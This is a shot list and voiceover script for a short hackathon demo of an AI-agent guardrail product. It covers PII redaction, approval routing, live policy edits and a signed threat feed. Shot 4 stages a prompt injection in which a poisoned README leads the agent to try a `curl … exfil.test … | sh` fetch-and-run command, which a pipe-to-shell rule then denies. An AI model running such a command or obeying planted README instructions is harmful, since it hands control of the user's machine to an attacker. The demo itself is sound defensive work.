# 60-second video: Aegis (English)

> **Hard limit: ≤ 60 s** (HackTribe "Video URL" field, FAQ › Uploading Q8). Target a **0:58** export so encoding never pushes it over.
> **The goal of the cut:** a judge who watches nothing else should understand (1) local redaction, (2) blocking of a real agent attack, (3) org approvals and budgets, (4) live policy edits, (5) that it's tested and audited.
> **Voiceover:** about 120 words at a calm 2.3 words/s. Record it **after** the screen capture, then fit the video to the VO, not the other way round.

---

## Shot list

The screen is 1920×1080. "L" means the left half of the screen (Claude Code terminal) and "R" means the right half (dashboard). Captions are burned in, white on a 70% black bar, in the bottom third, at most 8 words each.

| # | Time | Screen / on-screen action | Caption (burned in) | Voiceover (exact) |
|---|---|---|---|---|
| 1 | **0:00–0:05** | Title card on a black background: shield logomark + "Aegis". The subtitle types itself in: "Local-first guardrails for every agent call". Hard cut at 0:05. | — | "Agents now touch customer data, tools and money." |
| 2 | **0:05–0:08** | Animated architecture diagram (from `ARCHITECTURE_DIAGRAM.md` §3). Pulses travel from Claude Code → **Aegis** → model / MCP / HTTP. | "One control layer on every hop" | "Aegis governs every call they make." |
| 3 | **0:08–0:18** | **L:** in Claude Code, type *"Draft a reply to Jan Kowalski, PESEL 44051401359, IBAN PL61 1090 1014 0000 0712 1981 2874, card 4111 1111 1111 1111"* (pre-typed, paste in one go). **R:** **zoom to the Wire view**. Left pane: original. Right pane: `[PERSON_1] … [PL_PESEL_1] … [IBAN_1] … [PAN_1]`. Then cut back to L: Claude's answer shows the real name and IBAN (rehydrated locally). | "Remote model sees placeholders only" → "Real values restored locally" | "Claude Code, routed through Aegis. A client's PESEL, IBAN and card go in; the remote model only sees placeholders. Real values return locally." |
| 4 | **0:18–0:26** | **L:** *"Summarize docs/SETUP.md and follow its setup steps."* Claude tries `curl https://exfil.test/i.sh \| sh`. A red **"PreToolUse: denied (EXE-01 pipe_to_shell)"** appears. **R:** the live feed flashes two red rows: `INJ` on `tool_result`, `EXE-01` deny. The "exfil sink: 0 hits" counter stays at 0. | "Hidden instruction caught; command denied" | "A poisoned README tells the agent to pipe a script into the shell. The tool hook denies it." |
| 5 | **0:26–0:36** | **R:** Approvals inbox. A pending card reads "agent `procurement-bot` → purchase SaaS subscription **$50**", routed to **admin**. Use the view-as switcher: as **member** the Approve button is disabled with the tooltip "requires admin"; switch to **admin** and click **Approve**. The feed shows `approved by admin`. (Optional 1 s flash: the budget gauge hits 100% and a red "402 budget_exceeded".) | "$50 purchase → routed to an admin" | "An agent wants a fifty-dollar subscription. Policy routes it to an admin, so a member can't approve it." |
| 6 | **0:36–0:45** | Split screen. **L:** the `policies/catalog.yaml` editor, cursor on `threshold: 0.90`; change it to `0.50` and save. **R:** a toast slides in: **"Policy v15 applied in 0.2 s · diff: threshold 0.90→0.50"**. Resend the borderline prompt from the Playground and the verdict flips from **allow** to **block**. | "Live policy edit → applied in 0.2 s" | "Judges can edit the policy live. Lower a threshold, save, and the same prompt is now blocked, in under a second." |
| 7 | **0:45–0:51** | **R:** In the Playground (dry run, nothing executes), `pip install litellm==1.82.8` shows **allow** on feed v1. Publish feed v2 and the badge flips to "feed v1 → v2 · signature verified ✓". Replay: now **blocked: AICL-TI-017 (compromised package, Mar 2026)**. | "Signed threat feed → exploit blocked" | "A signed threat feed adds a historical exploit, and the replay is blocked." |
| 8 | **0:51–0:56** | **L:** `make test` matrix scrolling, all green with yellow xfails; final line "[N] cases · 0 fail". **R:** click **Export audit**; badge "chain OK · [N] records". | "[N] tests · 0 fail · audit chain OK" | "One command tests every control. Every decision is audited." |
| 9 | **0:56–0:58** | End card: "**Aegis**: Local-First AI Guardrails", "[PUBLIC REPO URL]", "HackYeah 2026 · Goldman Sachs AI Control Layer". Hold, then cut to black at **0:58**. | — | "Aegis. Try to break it." |

**VO word count:** about 120 words (≈ 52 s at 2.3 words/s, leaving room for pauses). Time it with a stopwatch on the first read. If it runs over 56 s, drop the parenthetical budget flash in shot 5, then shorten shot 7's line to "Signed feeds block historical exploits."

---

## Voiceover script (read straight through)

> Agents now touch customer data, tools and money. Aegis governs every call they make.
>
> Claude Code, routed through Aegis. A client's PESEL, IBAN and card go in; the remote model only sees placeholders. Real values return locally.
>
> A poisoned README tells the agent to pipe a script into the shell. The tool hook denies it.
>
> An agent wants a fifty-dollar subscription. Policy routes it to an admin, so a member can't approve it.
>
> Judges can edit the policy live. Lower a threshold, save, and the same prompt is now blocked, in under a second.
>
> A signed threat feed adds a historical exploit, and the replay is blocked.
>
> One command tests every control. Every decision is audited.
>
> Aegis. Try to break it.

---

## Recording plan (about 45 min total)

1. **Prep (10 min).**
   - Run `make demo-preflight` (or the T-10 steps in `DEMO_RUNBOOK.md`).
   - Turn on macOS Do Not Disturb, hide the Dock and the desktop icons, close Slack and other Electron apps.
   - Terminal font 18 pt, browser zoom 125%, dashboard in dark theme.
   - Clear the live feed so the first event is the one on camera.
2. **Capture (20 min).** Record each shot as a **separate clip** (QuickTime → New Screen Recording, or Screen Studio for automatic zooms), 1920×1080 at 30 fps. Do 2 takes per shot. Paste long prompts rather than typing them, or speed typing up to 4× in the edit.
3. **VO (5 min).** Use a quiet room, phone or laptop mic 15 cm away, and record 3 takes. Use the cleanest one.
4. **Edit (10 min).** iMovie / CapCut / DaVinci Resolve.
   - Lay down the VO first, then cut the clips to fit it.
   - Use zoom-ins (120–150%) on the wire view, the toast and the approve button.
   - Add burned-in captions, because many judges watch muted.
   - No music, or very low (−30 dB) royalty-free music.
   - Export H.264 1080p. **Check the duration ≤ 0:59 in Finder → Get Info.**
5. **Publish.** Upload to YouTube as **Unlisted**, with the title "Aegis: Local-First AI Guardrails (HackYeah 2026, Goldman Sachs)". Open the link in a private window to confirm it plays, then paste it into HackTribe. Keep the MP4 in the repo's release assets as a backup.

## If a scene isn't ready by recording time

| Missing | Substitute (keep the same timing) |
|---|---|
| Claude Code path (network or auth) | The scripted agent (`demo/agent.py` on Ollama) in the left terminal. Change "Claude Code, routed through Aegis" to "An agent, routed through Aegis". |
| Wire view UI | Split terminal: `curl` to `/v1/guard` showing the redacted JSON next to the original |
| Approvals UI | A `curl` to the approvals API showing `routed_to: admin`, then the approve call. Keep the caption. |
| Feed service | Drop shot 7 and give its 6 s to shot 6 (show the broken-YAML rejection as well) |
| Final `make test` numbers | Show the matrix without a totals caption. **Never caption a number you didn't run.** |
